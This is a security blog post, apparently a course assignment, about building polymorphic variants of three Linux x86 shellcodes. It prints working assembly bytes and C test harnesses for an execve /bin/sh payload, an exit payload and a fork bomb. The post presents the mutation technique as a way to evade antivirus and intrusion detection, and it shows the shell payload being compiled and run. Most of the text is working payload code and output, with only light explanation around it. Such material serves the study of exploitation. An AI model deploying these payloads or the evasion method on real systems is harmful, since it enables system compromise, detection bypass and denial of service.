---
layout: single
title: Polymorphic Shellcode - Linux x86
date: 2018-1-27
classes: wide
header:
  teaser: /assets/images/Polymorphic_shellcode_linux_x86/Execve.png
---

Introduction
------------
Polymorphism is a technique used to mutate code in a way that will keep the original functionality intact. For example, `1+1` and `4-2` both achieve the same result while using different values and operations. Polymorphic shellcode can aid in efforts to evade Anti-virus and IDS/IPS. This post will look at few shellcodes and how to produce polymorphic version of them.

Shellcode I
-----------
The first shellcode we’re going to work with is [execve()](http://shell-storm.org/shellcode/files/shellcode-827.php), which basically spawn shell for us.

```nasm
    *****************************************************
    *    Linux/x86 execve /bin/sh shellcode 23 bytes    *
    *****************************************************
    *	  	  Author: Hamza Megahed		        *
    *****************************************************
    *             Twitter: @Hamza_Mega                  *
    *****************************************************
    *     blog: hamza-mega[dot]blogspot[dot]com         *
    *****************************************************
    *   E-mail: hamza[dot]megahed[at]gmail[dot]com      *
    *****************************************************

xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

********************************
#include <stdio.h>
#include <string.h>
 
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}
```

Will mutate code and use the comments section to explain the process.

![](/assets/images/Polymorphic_shellcode_linux_x86/Execve.png)

Compile and test.

```sh
falafel@ubuntu:~/Desktop/Execve$ nasm -f elf32 -o Execve.o Execve.nasm
falafel@ubuntu:~/Desktop/Execve$ objdump -d ./Execve.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xc9\xeb\x05\x5b\x04\x0b\xcd\x80\xe8\xf6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
falafel@ubuntu:~/Desktop/Execve$ cat Execve.c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xc9\xeb\x05\x5b\x04\x0b\xcd\x80\xe8\xf6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
falafel@ubuntu:~/Desktop/Execve$ gcc -fno-stack-protector -z execstack Execve.c -o Execve
falafel@ubuntu:~/Desktop/Execve$ ./Execve 
Shellcode Length:  24
$ whoami
falafel
$
```

Shellcode II
------------
The second shellcode we’re going to mangle is [exit()](http://shell-storm.org/shellcode/files/shellcode-55.php), this one execute exit function with status code of 1.

```nasm
/* exit-core.c by Charles Stevenson < core@bokeoa.com >  
 *
 * I made this as a chunk you can paste in to make modular remote
 * exploits.  I use it when I need a process to exit cleanly.
 */
char hellcode[] = /*  _exit(1); linux/x86 by core */
// 7 bytes _exit(1) ... 'cause we're nice >:) by core
"\x31\xc0"              // xor  %eax,%eax
"\x40"                  // inc  %eax
"\x89\xc3"              // mov  %eax,%ebx
"\xcd\x80"              // int  $0x80
;

int main(void)
{
  void (*shell)() = (void *)&hellcode;
  printf("%d byte _exit(1); linux/x86 by core\n",
         strlen(hellcode));
  shell();
  return 0;
}
```

Mutate code and use the comments section to explain the process.

![](/assets/images/Polymorphic_shellcode_linux_x86/Exit.png)

Compile and test.

```sh
falafel@ubuntu:~/Desktop/Exit$ nasm -f elf32 -o Exit.o Exit.nasm
falafel@ubuntu:~/Desktop/Exit$ objdump -d ./Exit.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x6a\x02\x58\x48\x89\xc3\xcd\x80"
falafel@ubuntu:~/Desktop/Exit$ cat Exit.c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x02\x58\x48\x89\xc3\xcd\x80";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
falafel@ubuntu:~/Desktop/Exit$ gcc -fno-stack-protector -z execstack Exit.c -o Exit
falafel@ubuntu:~/Desktop/Exit$ ./Exit 
Shellcode Length:  8
falafel@ubuntu:~/Desktop/Exit$
```

Shellcode III
-------------
The third and last shellcode we’re going to deal with is [fork()](http://shell-storm.org/shellcode/files/shellcode-214.php), this one will enter fork loop otherwise known as forkbomb until system crashes.

```nasm
/* By Kris Katterjohn 8/29/2006
 *
 * 7 byte shellcode for a forkbomb
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *      push byte 2
 *      pop eax
 *      int 0x80
 *      jmp short _start
 */

main()
{
       char shellcode[] = "\x6a\x02\x58\xcd\x80\xeb\xf9";

       (*(void (*)()) shellcode)();
}
```

Mutate code and use the comments section to explain the process.

![](/assets/images/Polymorphic_shellcode_linux_x86/Fork.png)

Compile it.

```sh
falafel@ubuntu:~/Desktop/Fork$ nasm -f elf32 -o ForkBomb.o ForkBomb.nasm
falafel@ubuntu:~/Desktop/Fork$ objdump -d ./ForkBomb.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x83\xc0\x02\xcd\x80\xeb\xf7"
falafel@ubuntu:~/Desktop/Fork$ cat ForkBomb.c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x83\xc0\x02\xcd\x80\xeb\xf7";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
falafel@ubuntu:~/Desktop/Fork$ gcc -fno-stack-protector -z execstack ForkBomb.c -o ForkBomb
falafel@ubuntu:~/Desktop/Fork$
```

Obviously we’re not going to test this one unless we want to crash the system :D.

Closing Thoughts
----------------
I chose rather simple shellcode examples so we can focus on the basics really, hopefully you learned something from this post and feel free to contact me for questions via twitter [@ihack4falafel](https://twitter.com/ihack4falafel).

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1115

Github Repo: [https://github.com/ihack4falafel/SLAE32/tree/master/Assignment%206](https://github.com/ihack4falafel/SLAE32/tree/master/Assignment%206)
